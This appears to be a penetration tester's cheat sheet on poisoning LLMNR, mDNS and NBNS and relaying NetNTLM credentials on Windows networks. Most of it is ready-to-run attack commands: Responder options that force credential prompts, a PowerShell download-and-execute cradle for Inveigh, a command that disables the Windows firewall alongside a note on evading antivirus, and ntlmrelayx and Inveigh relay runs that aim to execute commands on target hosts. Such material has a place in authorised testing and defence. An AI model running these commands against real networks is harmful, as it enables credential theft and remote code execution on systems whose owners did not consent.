
# LLMNR/mDNS/NBNS poisonning and SMB relay

## Overview

MITRE ATT&CK mapping: [T1557.001](https://attack.mitre.org/beta/techniques/T1557/001/)

Reference:

```
LLMNR protocol: https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution
mDNS protocol: https://en.wikipedia.org/wiki/Multicast_DNS
NBNS protocol: https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP#Name_service
```

## Procedures

### Classic Responder LLMNR/mDNS/NBNS poisonning

```
# most lightweight version: poisonning + capturing requests only to SMB
Responder.py -I eth0 -f

# as aobove + acting as WPAD web proxy
Responder.py -I eth0 -wrf

# also forces users to provide their creds on WPAD
Responder.py -I eth0 -wfFbv
```

### PowerShell DNS/LLMNR/mDNS/NBNS poisonning

```
# details:
# https://github.com/Kevin-Robertson/Inveigh/
# https://github.com/Kevin-Robertson/Inveigh/wiki/Basics
Invoke-WebRequest -Uri https://github.com/Kevin-Robertson/Inveigh/archive/Inveigh-master.zip -OutFile Inveigh-master.zip

OR (how's this differnet?):

# downloading Inveigh in PowerShell and loading it into memory with:
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1")

# unzip (when .NET Framework 4.5 is available):
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
[System.IO.Compression.ZipFile]::ExtractToDirectory(".\Inveigh-master.zip", ".\Inveigh-master")

# source your PS scripts
cd .\Inveigh-master; cd .\Inveigh-master; . .\Inveigh.ps1

# turn off win firewall (also antivirus should be turned off or evaded):
netsh advfirewall set  allprofiles state off

# run in poisoning mode (Needs PS console with admin privs):
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y

# run in limited poisoning mode (no admin privs):
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -FileOutput Y

# to stop:
Stop-Inveigh
```

### NetNTLM Relay: classic

Prereq for success: 

1. SMB signing must not be enforced (i.e. one of the machines in the conversation must have `message_signing: disabled (dangerous, but default)` as a result of `nmap --script smb-security-mode -p445 192.168.12.0`)
2. For optimal impact (i.e. RCE) owner of the credetnials that are being relayed must have Local Admin privileges on target machine

**With Responder + impacket's ntlmrealyx/smbrealyx**

In `Responder.conf`:

```
; Servers to start
SQL = Off
SMB = Off
RDP = Off
Kerberos = Off
FTP = Off
POP = Off
SMTP = Off
IMAP = Off
HTTP = Off
HTTPS = Off
DNS = Off
LDAP = Off
```

Start responder: 

    responder -I eth0 -f -v`

Start ntlmrelayx:

    impacket-ntlmrelayx -t smb://<ip-to-relay-to> --enum-local-admins -smb2support

Reference:

    https://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-and-replay-them/
    https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments

**With Inveigh**

Capabilities:

NTLMv1/NTLMv2 HTTP/HTTPS/Proxy -> SMB2.1 relay

Procedure:

```
# we don't launch listener on HTTP as Invoke-InveighRelay will listen on it
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -HTTP N

# Prepare command to execute (e.g. launcher for C2 Empire):
TODO

# launch Relay (as cmd provide launcher command form Empire):
Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target <ip-to-relay-to> -Command <cmd-to-execute>
```

### NetNTLM Relay: IPv6 DNS server impersonation (mitm6)

    https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/

### Notes

Other tools:

```
https://www.fox-it.com/en/insights/blogs/blog/inside-windows-network/
https://github.com/SecureAuthCorp/impacket
```

## OPSEC considerations

## Counter-countermeasures
